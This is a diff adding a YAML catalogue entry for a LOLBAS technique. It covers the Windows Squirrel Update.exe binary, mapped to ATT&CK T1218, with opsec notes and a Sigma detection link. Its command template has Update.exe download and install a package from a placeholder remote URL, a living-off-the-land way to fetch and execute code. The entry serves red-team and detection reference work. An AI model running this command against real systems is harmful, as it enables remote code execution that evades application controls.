@@ -1,0 +1,31 @@
+id: lolbas/update/execute/6
+type: binary
+platform: windows
+name: Update.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: Update.exe spawned an unknown process
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
+commands:
+- template: Update.exe --updateRollback={REMOTEURL}
+  comment: The above binary will go to url and look for RELEASES file, download and install the nuget
+    package.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
+tags:
+- windows
+- lolbas
